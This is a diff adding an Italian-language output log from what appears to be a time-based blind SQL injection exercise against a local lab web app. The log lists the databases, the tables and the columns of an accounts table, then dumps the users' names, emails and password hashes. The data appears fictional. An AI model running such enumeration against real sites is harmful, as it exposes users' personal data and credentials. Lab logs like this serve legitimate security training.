@@ -1,0 +1,48 @@
+Url da attaccare http://192.168.33.10/sqli/time_based_blind.php con metodo GET
+Database: 4
+information_schema
+mysql
+performance_schema
+scotchbox
+Attacco scotchbox
+Tabelle: 3
+accounts
+datacapture
+messages
+Attacco accounts
+Campi: 5
+id
+first_name
+last_name
+email
+password
+Estraggo i valori del campo id
+Valori: 4
+1
+2
+3
+4
+Estraggo i valori del campo first_name
+Valori: 4
+Arthur
+Ford
+Tricia
+Zaphod
+Estraggo i valori del campo last_name
+Valori: 4
+Dent
+Prefect
+McMillan
+Beeblebrox
+Estraggo i valori del campo email
+Valori: 4
+arthur@guide.com
+ford@guide.com
+tricia@guide.com
+zaphod@guide.com
+Estraggo i valori del campo password
+Valori: 4
+d00ee262cdcbe7543210bb85f6f1cac257b4e994
+30f5cc99c17426a0d28acf8905c6d776039ad022
+bcb3358e273b5772ee0ae1799b612e13cc726b04
+0c38530eaca4dbc0f49c459c0c52b362f14215c3
